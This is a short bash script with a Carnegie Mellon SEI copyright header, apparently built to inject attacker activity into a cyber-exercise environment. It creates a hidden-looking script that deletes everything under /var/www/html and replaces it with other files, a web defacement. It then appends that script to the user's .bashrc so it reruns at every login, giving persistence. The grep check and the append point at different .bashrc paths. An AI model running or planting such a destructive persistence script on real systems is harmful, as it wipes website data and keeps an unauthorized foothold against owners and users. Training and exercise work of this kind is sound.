#!/bin/bash

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

cat <<EOF > /var/tmp/sinister_profile.sh

rm -rf /var/www/html/*
cp -r /var/tmp/x4sa24/* /var/www/html/

EOF

chmod +x /var/tmp/sinister_profile.sh

if grep -F "/var/tmp/sinister_profile.sh" /home/user/.bashrc
then
	:
else
cat <<EOF >> /home/$USER/.bashrc
	
# .bashrc

/var/tmp/sinister_profile.sh

EOF

fi

